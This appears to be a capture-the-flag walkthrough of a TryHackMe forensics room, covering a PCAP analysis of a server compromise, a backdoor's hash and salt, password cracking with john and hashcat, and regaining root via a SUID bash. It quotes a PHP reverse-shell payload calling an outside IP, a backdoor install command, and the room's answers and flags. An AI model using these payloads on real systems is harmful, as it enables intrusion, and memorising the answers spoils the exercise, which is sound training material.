# Task 1 Forensics - Analyse the PCAP

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing [Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals) as a bare minimum.  

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

### What was the URL of the page they used to upload a reverse shell?

Looking at the PCAP we can see line 14 in Wireshark

Answer: `/development/`

### What payload did the attacker use to gain access?

The same line, copy the PHP code from wireshark

Answer: `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`


### What password did the attacker use to privesc?

Walking through the pcap, we can see line 27 where the payload was triggered, and the reverse shell port being used is 4242. 

Line 76

Answer: `whenevernoteartinstant`


### How did the attacker establish persistence?

Line 121

Answer: `git clone https://github.com/NinjaJc01/ssh-backdoor`

### Using the fasttrack wordlist, how many of the system passwords were crackable?


Line 112 and line 114 we see shadow file being dumped

Use John
`john --format=sha512crypt --wordlist fasttrack.txt password`

Answer: `2`


# Task 2 Research - Analyse the code

Now that you've found the code for the backdoor, it's time to analyse it.

### What's the default hash for the backdoor?

Look at the github code
Line 19 var hash string
Answer: `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

### What's the hardcoded salt for the backdoor?

Line 168

Answer: `1c362db832f3f864c8c2fe05f2002a05`

### What was the hash that the attacker used? - go back to the PCAP for this!


Pcap line 3479

Answer: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
### Crack the hash using rockyou and a cracking tool of your choice. What's the password?

Looking at the hint`It's salted, so make sure you use the correct mode. This also means crackstation etc won't work.`

create hash.txt containing the hash:salt

`hashcat -a 0 -m 1710 hash.txt rockyou.txt`

Answer: `november16`

# Task 3 Attack - Get back in!

Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!

# The attacker defaced the website. What message did they leave as a heading?

Look at the target IP in a browser

Answer: `H4ck3d by CooctusClan`

SSH port 2222 using the password revealed in task 2
`ssh james@10.10.64.146 -p 2222 -oHostKeyAlgorithms=+ssh-rsa`

Answer: `thm{d119b4fa8c497ddb0525f7ad200e6567}`

### What's the root flag?

Tried to sudo, failed authentication, unable to get into root folder.  No history, no crontab
`find / -perm -u=s -type f 2>/dev/null`
shows `/home/james/.suid_bash`

```
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# 
```

Answer: `thm{d53b2684f169360bb9606c333873144d}`